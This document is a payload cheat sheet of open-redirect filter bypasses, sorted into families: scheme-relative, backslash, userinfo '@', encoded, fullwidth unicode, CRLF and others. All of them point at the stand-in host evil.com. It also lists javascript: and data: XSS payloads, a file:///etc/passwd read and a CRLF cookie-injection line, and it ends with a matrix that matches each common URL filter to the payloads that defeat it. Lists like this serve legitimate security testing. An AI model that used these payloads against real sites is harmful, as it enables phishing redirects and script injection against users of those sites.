# Payload dictionary — every open-redirect payload by family

## The absolute-URL family — the unfiltered baseline

```text
https://evil.com                     <- the canonical canary
https://evil.com/                    <- with the trailing slash
https://evil.com/landing             <- with a path
https://evil.com?x=1                 <- with a query
https://evil.com#frag                <- with a fragment
http://evil.com                      <- the http variant
HTTPS://evil.com                     <- the case-scheme
https://EVIL.COM                     <- the case-host
https://evil.com:443                 <- the explicit port
https://evil.com:4443                <- a non-standard port
```

## The scheme-relative `//` family

```text
//evil.com                           <- the canonical scheme-relative
//evil.com/                          <- with the slash
//evil.com/path                      <- with a path
//%65vil.com                         <- an encoded host-char
//evil%2ecom                         <- an encoded .
//%2f%2fevil.com                     <- hmm — the path-form
///evil.com                          <- the triple-slash
////evil.com                         <- the quad-slash
/////evil.com                        <- five
//evil.com%2f.target.com             <- an encoded char
//evil.com%40target.com              <- the @ in the netloc
//evil.com%23target.com              <- the # fragment
//evil.com%3ftarget.com              <- the ? query
/%2fevil.com                         <- / + encoded /
%2f%2fevil.com                       <- encoded //
%252f%252fevil.com                   <- double-encoded //
```

## The backslash family

```text
/\evil.com                           <- / + \
\/evil.com                           <- \ + /
\\evil.com                           <- the UNC \\
/\/evil.com                          <- / + \ + /
/\//\evil.com                        <- interleaved
/%5cevil.com                         <- / + encoded \
%5cevil.com                          <- an encoded \ alone
%5c%5cevil.com                       <- encoded \\
/%255cevil.com                       <- double-encoded \
\\%65vil.com                         <- encoded host
/\%2fevil.com                        <- /\ + encoded /
%2f%5cevil.com                       <- encoded / + encoded \
%5c%2fevil.com                       <- encoded \ + encoded /
//\\evil.com                         <- // + \\
//\evil.com                          <- // + \
```

## The userinfo `@` family

```text
https://target.com@evil.com          <- the canonical userinfo
https://evil.com@target.com          <- the reverse
https://user:pass@evil.com           <- a full userinfo
https://target.com:443@evil.com      <- userinfo+port
https://evil.com\@target.com         <- the \@ escape
https://evil.com%40target.com        <- the encoded @
https://evil.com%2540target.com      <- the double-encoded @
https://target.com%40evil.com        <- the @ the other order
https://evil.com?@target.com         <- the @ in the query
https://evil.com#@target.com         <- the @ in the fragment
https://evil.com%2f%40target.com     <- encoded /@
https://evil.com%3f%40target.com     <- encoded ?@
https://evil.com%23%40target.com     <- encoded #@
https://target.com.%40evil.com       <- trailing-dot + @
```

## The substring/suffix family

```text
https://target.com.evil.com          <- a subdomain
https://x.target.com.evil.com        <- a deeper subdomain
https://target.com-evil.com          <- a hyphen-suffix
https://eviltarget.com               <- a no-boundary
https://target.com.evil.com.evil.com <- a deeper-subdomain
https://evil.com/target.com          <- the substring in the path
https://evil.com/x/target.com        <- deeper in the path
https://evil.com?target.com          <- in the query
https://evil.com?x=target.com        <- a named query
https://evil.com#target.com          <- in the fragment
https://x.target.com@evil.com        <- a subdomain-userinfo mix
https://target.com%2eevil.com        <- an encoded . in the host
https://target.com%252eevil.com      <- double-encoded .
```

## The encoded-char family

```text
https:%2f%2fevil.com                 <- the encoded // after :
https%3a%2f%2fevil.com               <- the fully-encoded
https%3a//evil.com                   <- partial
https:%2f%5cevil.com                 <- encoded / + \
https:%5c%5cevil.com                 <- encoded \\
https%253a%252f%252fevil.com         <- double-encoded
https%3a%2f%2f%65vil.com             <- a host-char encoded
https://evil%2ecom                   <- an encoded .
https://evil%252ecom                 <- a double-encoded .
https://evil%2ecom%2f.target.com     <- encoded . + path
```

## The scheme family

```text
https:evil.com                       <- a scheme with no //
https:/evil.com                      <- a scheme + one /
https:/\evil.com                     <- a scheme + /\
https:\\evil.com                     <- a scheme + \\
https:/\/evil.com                    <- a scheme + /\/
https:%5cevil.com                    <- a scheme + encoded \
https:%2fevil.com                    <- a scheme + encoded /
https:/%2fevil.com                   <- a scheme + / + encoded /
HtTpS://evil.com                     <- a case-scheme
hTTps:%2f%2fevil.com                 <- case + encode
javascript:alert(1)                  <- the JS-scheme XSS-twin
javascript://%0aalert(1)             <- comment-obfuscated
javascript://x%0aalert(1)            <- a variant
JaVaScRiPt:alert(1)                  <- a case-scheme
data:text/html,<script>alert(1)</script>         <- the data: XSS
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:image/svg+xml,<svg onload=alert(1)>
vbscript:msgbox(1)                   <- the vbscript: legacy
file:///etc/passwd                   <- the file: LFI-twin
about:blank                          <- the about:
blob:https://target.com/<uuid>       <- the blob:
intent://evil.com                    <- the intent: deep-link
jar:https://evil.com!/x              <- the jar: legacy
```

## The unicode/fullwidth family

```text
https:%ef%bc%8f%ef%bc%8fevil.com     <- the fullwidth //
https://evil%ef%bc%8ecom             <- the fullwidth .
https://evil%ef%bc%a0target.com      <- the fullwidth @
https://evil.com%ef%bc%83target.com  <- the fullwidth #
https://evil.com%ef%bc%9ftarget.com  <- the fullwidth ?
evil%E3%80%82com                     <- the ideographic 。
https://%65vil.com                   <- an encoded ASCII char
https://xn--evil-xxx.com             <- a punycode host
```

## The whitespace/control family

```text
%20https://evil.com                  <- a leading space
%09https://evil.com                  <- a leading tab
%0ahttps://evil.com                  <- a leading LF
%0d%0ahttps://evil.com               <- a leading CRLF
%0dhttps://evil.com                  <- a leading CR
https://evil.com%20                  <- a trailing space
https://evil.com%09                  <- a trailing tab
  https://evil.com                   <- a literal leading space
https://evil.com%0d%0a               <- a trailing CRLF
https://evil.com%0d%0aSet-Cookie:x=y <- the CRLF-split twin
```

## The relative-path family — the NEGATIVE baseline

```text
/dashboard                           <- a safe relative — a NEGATIVE
/x/y/z                               <- a deeper relative
./dashboard                          <- a dot-relative
../dashboard                         <- a dotdot-relative
?next=dashboard                      <- a bare word — resolves relative
evil.com                             <- a bare word — resolves RELATIVE to
                                        the origin -> target.com/evil.com
                                        — NOT the gap
```

## The multi-hop family — the chained redirect

```text
https://target.com/redirect?next=https://evil.com   <- a second-redirect
                                                        hop through a
                                                        target.com redirect
https://target.com/x?url=//evil.com                  <- a nested redirect
https://evil.com?r=https://target.com                <- a bounce-back
```

## The payload-selection matrix

| The filter | The first family | The residual family |
|---|---|---|
| none | absolute-URL | — |
| `startswith('/')` | `//`-family | backslash |
| `startswith('/') && !//` | backslash | encoded-backslash |
| `contains('target.com')` | substring | subdomain |
| `endswith('target.com')` | substring/no-boundary | subdomain |
| `hostname==` | userinfo `\@` | encoded/double-encode |
| `no '://'` | `//`-family | `\\`/unicode |
| `scheme in [http,https]` | `https:evil.com` | — |
| the encoded check | encoded-char | double-encode |
| ASCII check | unicode/fullwidth | — |
